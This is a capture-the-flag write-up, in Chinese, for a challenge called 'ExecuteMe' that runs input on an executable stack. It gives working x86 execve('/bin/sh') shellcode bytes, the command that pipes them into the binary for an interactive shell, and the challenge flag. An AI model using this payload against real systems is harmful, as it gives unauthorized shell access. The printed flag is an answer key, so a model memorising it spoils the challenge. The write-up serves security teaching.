# ExecuteMe
 * [Makefile](Makefile)中，`-zexestack`把原本預設的`stack as non-executable``拿掉了，能在stack上執行任何code
 * [程式碼](execute.c) function_ptr
```c
typedef void (*function_ptr)();
...
((function_ptr)buf)();
```
 * function pointer？
  * 每個function包含code和指到code的function pointer
  * code必須是**可執行的assembly code**
 * 而buf在傳給function_ptr前，會先經過：`read(0, buf, 128);`
 * 因此，我們要創造的code，**不能包含\x0**，否則copy function會當作結束字元

## Solve
寫個開啟shell的code，使用system call `execve`，需要參數和stack
 * registers
  * eax: 0xb, ebx: addr of `/bin/sh`, ecx: esp, edx: 0x0
 * `execve("/bin/sh", NULL, NULL)`，需要 stack
  * push 0x0
  * push 0x0
  * push addr of `/bin/sh`
  * call `execve`
 * 寫成[x86 assembly code](writing_shellcode/shellcode.asm), 使用assembly `nasm`, linker `ld`
```
$ nasm -f elf shellcode.asm && ld -m elf_i386 -s -o shellcode shellcode.o && ./shellcode
$
```
 * 轉成hex: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
 * 放入程式執行
```
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') | ./execute
Segmentation fault
```
 * 不懂為何 segmentation fault, 只好上網找別人做[x86 shellcode](https://www.exploit-db.com/exploits/37069/)的，放入執行
```bash
pico62895@shell:/home/execute$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"') | ./execute
pico62895@shell:/home/execute$
```
 成功執行，但在我們能輸入其他指令前就結束了
 * 使用cat讓他開著，並且會把結果印到terminal上：
```bash
pico62895@shell:/home/execute$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'; cat) | ./execute
ls
Makefile   core       execute	 execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
```
